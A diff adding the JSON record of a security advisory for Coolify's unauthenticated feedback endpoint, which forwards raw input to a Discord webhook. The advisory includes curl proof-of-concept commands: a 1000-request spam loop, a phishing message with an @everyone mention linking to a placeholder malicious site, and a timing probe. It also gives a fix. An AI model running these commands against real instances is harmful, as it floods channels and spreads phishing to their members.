@@ -1,0 +1,48 @@
+{
+  "global": null,
+  "id": "GHSA-v64c-v633-58xp",
+  "repo": {
+    "cve_id": "CVE-2026-41899",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 6.5,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [],
+    "description": "## Summary\n`POST /api/feedback` has no authentication, no rate limiting, and no input validation. Arbitrary content is forwarded directly to a Discord webhook, enabling spam, content injection, and webhook abuse.\n\n## Details\n\n### Vulnerable Code\n\n**`routes/api.php`, line 29:**\n```php\nRoute::post('/feedback', [OtherController::class, 'feedback']);\n// No middleware - completely open to the internet\n```\n\n**`app/Http/Controllers/Api/OtherController.php`, lines 148-158:**\n```php\npublic function feedback(Request $request)\n{\n    $content = $request->input('content');  // No validation, no sanitization\n    $webhook_url = config('constants.webhooks.feedback_discord_webhook');\n    if ($webhook_url) {\n        Http::post($webhook_url, [\n            'content' => $content,  // Raw user input sent to Discord\n        ]);\n    }\n    return response()->json(['message' => 'Feedback sent.'], 200);\n}\n```\n\n### Root Cause\nThe endpoint is defined outside all middleware groups in `api.php`. There is no `auth:sanctum`, no `throttle`, and no input validation. The `$content` parameter is sent directly to Discord without sanitization.\n\n## PoC\n\n### Prerequisites\n- Coolify v4.0.0-beta.468 instance accessible from the internet\n- No authentication required\n\n### Steps to Reproduce\n\n#### Scenario 1: Discord Channel Spam (DoS)\n\n```bash\n# Send unlimited messages to the project's Discord channel\n# No authentication, no rate limiting\nfor i in $(seq 1 1000); do\n  curl -s -X POST 'https://coolify.example.com/api/feedback' \\\n    -H 'Content-Type: application/json' \\\n    -d '{\"content\": \"SPAM MESSAGE #'$i' - This channel is being flooded\"}' &\ndone\nwait\n\n# Result: 1000 messages sent to Discord in seconds\n# Discord webhook rate limit (~30 messages/minute) will be exhausted\n# Legitimate feedback will be blocked\n```\n\n#### Scenario 2: Discord Content Injection (Phishing)\n\n```bash\n# Inject malicious content with Discord markdown formatting\ncurl -X POST 'https://coolify.example.com/api/feedback' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\n    \"content\": \"@everyone \\n\\n**URGENT SECURITY UPDATE** \\n\\nCoolify has detected a critical vulnerability in your instance. Please update immediately by visiting: https://evil-phishing-site.com/coolify-update \\n\\nThis is an automated security notification from the Coolify team.\"\n  }'\n\n# Result: Phishing message appears in the official Discord channel\n# @everyone mention notifies all channel members\n```\n\n#### Scenario 3: Webhook URL Discovery\n\n```bash\n# Send a request and observe timing to confirm webhook is configured\ntime curl -X POST 'https://coolify.example.com/api/feedback' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"content\": \"test\"}'\n\n# Slow response (~200ms+) = webhook URL is configured and request was sent\n# Fast response (~10ms) = no webhook configured\n```\n\n## Impact\n**Severity: Medium (CVSS 5.3)**\n\n- **Discord Channel DoS:** Exhaust webhook rate limits, blocking legitimate notifications\n- **Content Injection:** Post phishing links, malware URLs, or misleading messages in official channels\n- **Reputation Damage:** Attackers can post offensive content appearing to come from the Coolify instance\n- **Webhook Enumeration:** Confirm whether a Discord webhook is configured\n\n**Who is affected:**\n- All Coolify instances running v4.0.0-beta.468 or earlier with a feedback Discord webhook configured\n- The Coolify project's own Discord server (if cloud instances use a shared webhook)\n\n**CWE:** CWE-306 (Missing Authentication for Critical Function), CWE-770 (Allocation of Resources Without Limits)\n\n## Recommended Fix\n```php\n// Add authentication and rate limiting middleware:\nRoute::post('/feedback', [OtherController::class, 'feedback'])\n    ->middleware(['auth:sanctum', 'throttle:10,1']);\n\n// Add input validation in the controller:\n$request->validate([\n    'content' => 'required|string|max:1000',\n]);\n```\n\n## Affected Version\nv4.0.0-beta.468 and earlier",
+    "ghsa_id": "GHSA-v64c-v633-58xp",
+    "html_url": "https://github.com/coollabsio/coolify/security/advisories/GHSA-v64c-v633-58xp",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-v64c-v633-58xp"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-41899"
+      }
+    ],
+    "published_at": "2026-07-02T16:39:09Z",
+    "references": [],
+    "severity": "medium",
+    "summary": "Unauthenticated Feedback Endpoint Allows Abuse (No Auth, No Rate Limit)",
+    "updated_at": "2026-07-02T16:39:09Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "coollabsio/coolify"
+        },
+        "patched_versions": "4.0.0-beta.474",
+        "vulnerable_version_range": "< 4.0.0-beta.474"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "coollabsio/coolify"
+}
